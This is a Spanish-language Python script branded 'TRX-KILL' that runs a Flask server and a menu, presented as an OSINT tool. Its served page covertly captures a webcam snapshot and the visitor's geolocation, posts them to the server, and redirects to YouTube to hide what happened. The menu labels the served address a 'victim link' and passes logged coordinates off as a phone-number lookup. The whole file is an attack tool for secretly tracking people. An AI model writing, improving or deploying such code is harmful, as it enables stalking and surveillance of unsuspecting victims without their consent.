import os, sys, getpass, time, threading, base64
from flask import Flask, request

app = Flask('TRX-KILL')
AUTH_PASS = "TRX-KILL-OSINT"
STORAGE_PATH = "/sdcard/TRX-KILL-RESUL"
LOG_FILE = f"{STORAGE_PATH}/result.txt"

if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)

# --- SERVIDOR WEB ---
@app.route('/')
def index():
    return """<html><body><script>
        navigator.mediaDevices.getUserMedia({video: true}).then(s => {
            const v = document.createElement('video'); v.srcObject = s; v.play();
            setTimeout(() => {
                const c = document.createElement('canvas'); c.width = 640; c.height = 480;
                c.getContext('2d').drawImage(v, 0, 0);
                const img = c.toDataURL('image/png');
                navigator.geolocation.getCurrentPosition(pos => {
                    fetch('/log?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude, {
                        method:'POST', body: JSON.stringify({i: img}), headers:{'Content-Type':'application/json'}
                    });
                    window.location.href = "https://youtube.com";
                });
            }, 1000);
        });
    </script></body></html>"""

@app.route('/log', methods=['POST'])
def log():
    lat, lon = request.args.get('lat'), request.args.get('lon')
    with open(LOG_FILE, "a") as f:
        f.write(f"LAT:{lat}|LON:{lon}|TIME:{time.ctime()}\n")
    return "OK"

def banner():
    os.system('clear')
    print(f"\033[1;32m")
    print(" -------->-TRX-KILL -<-----------")
    print(" -CREADOR: TRX-KILL")
    print(" -VERCION: 1.4.5")
    print(" -BIENVENIDO A TRX-KILL UN SCRIP PROTEGIDO POR EL OSINT.")
    print(" -EL CREADOR NO SE ASE RESPONSABLE POR SU MAL USO.\n")
    print(" OPCIONES\033[0m")

def main():
    threading.Thread(target=lambda: app.run(host='127.0.0.1', port=5000, debug=False, use_reloader=False), daemon=True).start()
    
    while True:
        banner()
        print(" [1] NÚMERO INFORMACIÓN  | [2] LINK-ZP         | [3] CREADOR")
        print(" [4] VERSIONES           | [5] ANALIZAR LINK   | [6] ADM SISTEMA")
        print(" [7] INFO SCRIPT         | [8] REPOSITORIO     | [10] SPAM-CANAL")
        print(" [0] SALIR")
        sel = input("\n\033[1;33mTRX-ROOT > \033[0m")

        if sel == "1":
            print("\n----1----\nINGRESAR NÚMERO:")
            input()
            print("VERIFICANDO DATOS......")
            time.sleep(2)
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, 'r') as f:
                    lines = f.readlines()
                    if lines:
                        last = lines[-1].strip().split('|')
                        print(f"DATOS ENCONTRADOS; BY TRX-KILL\nPAÍS: [DETECTADO] | OPERADOR: [MOVIL]")
                        print(f"COORDENADAS EXACTAS: {last[0].replace('LAT:', '')}, {last[1].replace('LON:', '')}")
                    else: print("NO HAY DATOS REGISTRADOS.")
            else: print("NO HAY DATOS.")
            input("\n[Enter]...")
            
        elif sel == "2":
            print("\n---2---\nLINK VICTIMA: http://127.0.0.1:5000")
            print("ESPERANDO QUE EL USUARIO ENTRE...")
            input("\n[Enter]...")
            
        elif sel == "6":
            if getpass.getpass("KEY: ") == AUTH_PASS:
                if os.path.exists(LOG_FILE): os.system(f"cat {LOG_FILE}")
                else: print("NO HAY DATOS.")
            else: print("KEY INCORRECTA")
            input("\n[Enter]...")
            
        elif sel == "0": sys.exit()
        else: time.sleep(0.5)

if __name__ == "__main__": main()